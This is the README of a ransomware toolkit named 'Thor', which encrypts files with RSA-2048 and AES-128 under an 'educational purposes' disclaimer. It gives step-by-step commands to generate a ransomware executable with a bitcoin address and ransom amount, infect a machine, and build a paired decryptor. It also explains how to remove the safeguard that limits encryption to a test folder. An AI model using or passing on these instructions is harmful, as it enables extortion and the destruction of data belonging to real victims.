# Thor

Thor is a ransomware.<br>
It uses **RSA-2048** with **AES-128** to encrypt files.<br>

## For educational purposes

> This software is **STRICTLY** for educational purposes.

### How to stay safe while playing with this code?

> **DO NOT** uncomment the lines within `payload/agent/lib/file_finder.py`
> By default, it will only encrypt files within a folder in your desktop named `Target_Folder`<br>
> **Warning:** Do not run this code on your PC, use a VM instead. And If you do run it, let it run all the way.

## Notice:

> I will not be responsible for your actions.
> **DO NOT** touch this code if you lack self-control.

### For your protection

> For your own protection this ransomware will only encrypt files within a folder named `Target_Folder` within your desktop.
> You can tell it lock all files by uncommenting a few lines within `payload/agent/lib/file_finder.py`

### Requirements

- Python **3.6.x** | **3.7.x**

### Usage with a VM

1. Uncomment the commented out section of `payload/agent/lib/file_finder.py`

2. Generate server's public key pair `python thor.py`

3. Change directory into payload directory

4. Run the `encryptor_generator.py`

5. Infect your VM with the exe

6. Get the encrypted RSA private key that the exe outputs from your VM

7. Change directory back into payload directory

8. Run the `decryptor_generator.py` and give it the RSA keys

9. Send the decryptor.exe to the VM

10. Let the decryptor run and decrypt the files within your VM<br><br>

### No sharing

Each time you generate an ransomware, you must generate a decryptor for that ransomware. You cannot generate one decryptor and use it with differently generated ransomware.<br>

### Example usage

1.  Install requirements
    ```
    pip install -r requirements.txt
    ```
2.  Generate server's public key pair
    ```
    python thor.py
    ```
3.  Change directory into payload & generate a ransomware
    ```
    python encryptor_generator.py -b mybtcadress -a 120 -k ../server/keys/public.pem -n virus_danger
    ```
4.  Change directory into payload & generate a decryptor
    ```
    python decryptor_generator.py -sk ../server/keys/private.key -vk encrypted_private.ekey -n decryptor
    ```

# Disclaimer

```
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR

IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,

FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE

AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER

LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,

OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE

SOFTWARE. THIS SOFTWARE IS PURELY FOR EDUCATIONAL PURPOSES.
```
